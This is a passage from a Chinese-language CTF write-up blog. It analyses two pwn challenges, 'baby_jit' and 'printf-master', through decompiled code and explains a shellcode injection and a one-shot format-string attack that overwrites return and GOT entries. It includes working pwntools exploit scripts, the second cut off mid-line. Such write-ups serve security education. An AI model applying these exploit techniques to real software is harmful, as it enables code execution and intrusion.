class="keyword">return</span> result;</span><br><span class="line">&#125;                                               <span class="comment">// 就是保持有一个堆块恰好能装下所有chunk_s的地址</span></span><br></pre></td></tr></table></figure><p>add就是一直保持有一个堆块刚好存了所有的堆块的地址，每个heap_s都有一个0x30的内容</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line">  <span class="type">int</span> offset; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> *endptr; <span class="comment">// [rsp+18h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;offset?&quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">8</span>, stdin);</span><br><span class="line">  offset = (<span class="type">int</span>)(<span class="built_in">atof</span>(s) * <span class="number">12.0</span>);</span><br><span class="line">  v3 = <span class="number">12</span> * count + <span class="number">4</span>;</span><br><span class="line">  v6 = (<span class="type">char</span> *)<span class="built_in">mmap</span>((<span class="type">void</span> *)<span class="number">0x100000</span>, <span class="number">12</span> * count + <span class="number">20</span>, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  v6[v3 - <span class="number">4</span>] = <span class="number">0x48</span>;</span><br><span class="line">  v6[v3 - <span class="number">3</span>] = <span class="number">0x89</span>;</span><br><span class="line">  v6[v3 - <span class="number">2</span>] = <span class="number">0xD8</span>;</span><br><span class="line">  v6[v3 - <span class="number">1</span>] = <span class="number">0xC3</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; count; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    s1 = (<span class="type">char</span> *)*((_QWORD *)heap + i);</span><br><span class="line">    *v6 = <span class="number">0x48</span>;</span><br><span class="line">    v6[<span class="number">1</span>] = <span class="number">0xB8</span>;</span><br><span class="line">    v5 = <span class="built_in">strtoull</span>(s1 + <span class="number">4</span>, &amp;endptr, <span class="number">10</span>);</span><br><span class="line">    *(_QWORD *)(v6 + <span class="number">2</span>) = v5;</span><br><span class="line">    v6 += <span class="number">10</span>;</span><br><span class="line">    *v6 = <span class="number">0x48</span>;</span><br><span class="line">    v6[<span class="number">2</span>] = <span class="number">-61</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;add&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;sub&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6[<span class="number">1</span>] = <span class="number">0x29</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;xor&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6[<span class="number">1</span>] = <span class="number">0x31</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;and&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6[<span class="number">1</span>] = <span class="number">0x21</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 += <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = ((__int64 (*)(<span class="type">void</span>))(offset + <span class="number">0x100000</span>))();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;result = %llu\n&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">munmap</span>((<span class="type">void</span> *)<span class="number">0x100000</span>, v3);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先会记录一个offset，该offset可以为小数，之后取整数部分，之后的判断add和sub那些主要是要堆块的内容为”add deadbeef”之类的会将add改为对应的机器码，之后会执行0x100000+offset上的函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000015B</span>0 <span class="number">48</span> <span class="number">31</span> DB                      <span class="keyword">xor</span>     rbx, rbx</span><br><span class="line">.text:<span class="number">00000000000015B</span>3 <span class="number">8B</span> <span class="number">45</span> C0                      mov     eax, [rbp+offset]</span><br><span class="line">.text:<span class="number">00000000000015B</span>6 <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">10</span> <span class="number">00</span>                add     eax, <span class="number">100000</span>h</span><br><span class="line">.text:<span class="number">00000000000015B</span>B <span class="number">48</span> <span class="number">98</span>                         cdqe</span><br><span class="line">.text:<span class="number">00000000000015B</span>D <span class="number">48</span> <span class="number">89</span> C2                      mov     rdx, rax</span><br><span class="line">.text:<span class="number">00000000000015</span>C0 B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000000015</span>C5 FF D2                         call    rdx</span><br></pre></td></tr></table></figure><p>我们可以看到该执行用call rdx来执行，那么如果我们只用简短的一行指令进行read(0,rdx,nbytes)，那么我们就可以将之后的机器码覆盖为我们想要的东西，这道题感觉我之前遇到过一个类似的思路也是用read来执行机器码，主要是逆向的问题，我在比赛的时候没有搞懂add和sub那些判断的作用，一直卡在那里，但是其实这些都是没用的！！！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">FILENAME=<span class="string">&#x27;./baby_jit&#x27;</span></span><br><span class="line">p= process(FILENAME)</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line"><span class="keyword">if</span>(script):</span><br><span class="line">gdb.attach(p, script)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">context</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(context)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">context</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;offset&#x27;</span>)</span><br><span class="line">    p.sendline(context)</span><br><span class="line"></span><br><span class="line">calc_sh= <span class="built_in">str</span>(u64(<span class="string">b&#x27;\x00\x90\x50\x5f\x52\x5e\x0f\x05&#x27;</span>)) </span><br><span class="line"><span class="string">&#x27;&#x27;</span></span><br><span class="line">sh=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">push   rax</span></span><br><span class="line"><span class="string">pop    rdi</span></span><br><span class="line"><span class="string">push   rdx</span></span><br><span class="line"><span class="string">pop    rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span></span><br><span class="line">Add(<span class="string">f&#x27;add <span class="subst">&#123;calc_sh&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">Exec(<span class="string">b&#x27;0.3&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x90&#x27;</span>*(<span class="number">0x20</span>)+asm(shellcraft.cat(<span class="string">&#x27;flag&#x27;</span>)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="printf-master"><a href="#printf-master" class="headerlink" title="printf-master"></a>printf-master</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">myinit</span>();</span><br><span class="line">  <span class="built_in">gift</span>(a1, a2);</span><br><span class="line">  <span class="built_in">vuln</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会有一个gift，选择stack，heap，libc的低字节</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">gift</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( dword_4080 == <span class="number">-559038737</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Get stack address&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Get heap  address&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Get libc  address&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. Get code  address&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">    buf = ptr;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, ptr, <span class="number">4uLL</span>);</span><br><span class="line">    v0 = *buf;</span><br><span class="line">    <span class="keyword">if</span> ( v0 == <span class="number">52</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Your gift: %#x\n&quot;</span>, &amp;ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *buf &gt; <span class="number">0x34</span>u )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      <span class="keyword">switch</span> ( v0 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Your gift: %#x\n&quot;</span>, &amp;puts);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Your gift: %#x\n&quot;</span>, (&amp;savedregs - <span class="number">16</span>));</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Your gift: %#x\n&quot;</span>, buf);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">LABEL_12:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Not allowed!&quot;</span>);</span><br><span class="line">          _exit(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  dword_4080 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后便是主要部分</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __noreturn <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now, what&#x27;s your name?&quot;</span>);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x101</span>uLL);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(buf, <span class="string">&#x27;$&#x27;</span>) )                       <span class="comment">// 不允许出现$</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Not allowed!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(buf + i) == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">      ++v0;                                     <span class="comment">// n最多出现4次</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt; <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Not allowed!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="built_in">free</span>(buf);</span><br><span class="line">  ptr = <span class="number">0LL</span>;</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个一次性的格式化字符串漏洞，发现不能出现$，因此使用%c进行占位，因此%c输出的内容的字节是固定的，因此使用%c来进行占位可以更好的进行覆盖</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>首先先将printf的返回地址覆盖成start地址，同时泄露elfbase，libcbase等<ul><li>容易出现问题的地方：第一是vuln函数的退出是通过exit的，因此只能直接覆盖printf的返回地址了；第二是要覆盖为start地址，因为要恢复栈帧，不然之后的跳板会无法找到</li></ul></li><li>然后将exit_got覆盖为start地址，实现无限格式化字符串漏洞</li><li>之后便是覆盖<code>___stack_chk_fail_got</code>为<code>one_gadget</code></li><li>最后将<code>exit_got</code>覆盖为<code>___stack_chk_fail</code>即可</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">ra  =<span class="keyword">lambda</span> time=<span class="number">0.5</span>:p.recvall(timeout=time)</span><br><span class="line">u7f =<span class="keyword">lambda</span>:u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> s,n     :<span class="built_in">print</span>(<span class="string">&quot;\033[31m[&quot;</span>+s+<span class="string">&quot; -&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(n))+<span class="string">&quot;]\033[0m&quot;</span>)</span><br><span class="line">fmt =<span class="keyword">lambda</span> string:<span class="built_in">eval</span>(<span class="string">f&quot;f&#x27;&#x27;&#x27;<span class="subst">&#123;string&#125;</span>&#x27;&#x27;&#x27;&quot;</span>, <span class="built_in">globals</span>()).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line"><span class="keyword">if</span>(script):</span><br><span class="line">gdb.attach(p, script)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line"><span class="keyword">return</span> process(elf_path)</span><br><span class="line"><span class="keyword">return</span> remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1234</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=run()</span><br><span class="line">        sa(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>,tbs(<span class="number">1</span>))</span><br><span class="line">        ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">        stack=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">        leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line">        <span class="comment">#第一步</span></span><br><span class="line">        payload=<span class="string">b&#x27;%c&#x27;</span>*<span class="number">10</span>+<span class="string">b&#x27;%p&#x27;</span>+<span class="string">b&#x27;%c&#x27;</span>*<span class="number">3</span>+<span class="string">b&#x27;%p&#x27;</span>+fmt(<span class="string">&#x27;%&#123;stack-0x29-0x18&#125;c&#x27;</span>)+<span class="string">b&#x27;%hn&#x27;</span>+<span class="string">b&#x27;%c&#x27;</span>*<span class="number">26</span>+fmt(<span class="string">&#x27;%&#123;0xa1b0-stack-26+0x18&#125;c&#x27;</span>)+<span class="string">b&#x27;%hn&#x27;</span></span><br><span class="line">        <span class="comment"># debug()</span></span><br><span class="line">        sa(<span class="string">b&#x27;your name?\n&#x27;</span>,payload)</span><br><span class="line">        ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">        elf_base=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x16bd</span></span><br><span class="line">        leak(<span class="string">&quot;elf_base&quot;</span>,elf_base)</span><br><span class="line">        ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">        libc_base=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x24083</span></span><br><span class="line">        <span class="comment"># leak(&#x27;code&#x27;,code)</span></span><br><span class="line">        leak(<span class="string">&#x27;libc&#x27;</span>,libc_base)</span><br><span class="line">        system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        og=[<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">        execve=libc_base+og[<span 